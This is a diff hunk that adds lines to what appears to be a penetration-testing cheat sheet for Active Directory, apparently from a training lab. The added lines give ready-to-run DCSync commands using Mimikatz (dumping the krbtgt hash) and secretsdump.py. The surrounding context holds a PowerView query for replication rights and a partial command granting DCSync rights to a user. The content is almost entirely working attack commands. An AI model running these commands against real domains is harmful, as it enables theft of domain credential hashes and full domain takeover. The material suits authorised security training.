@@ -144,6 +144,16 @@ For all user of the domain:
 Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')}
 ```
 
+DC Sync With MIMIKATZ
+```
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
+```
+
+DCSync with secretdump
+```
+secretsdump.py -hashes <> -just-dc-ntlm <domain>/<user>@<IP-DC>
+```
+
 ### ADD DCSync Right to USER
 ```
 Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName <..USER..> -Rights DCSync -Verbos
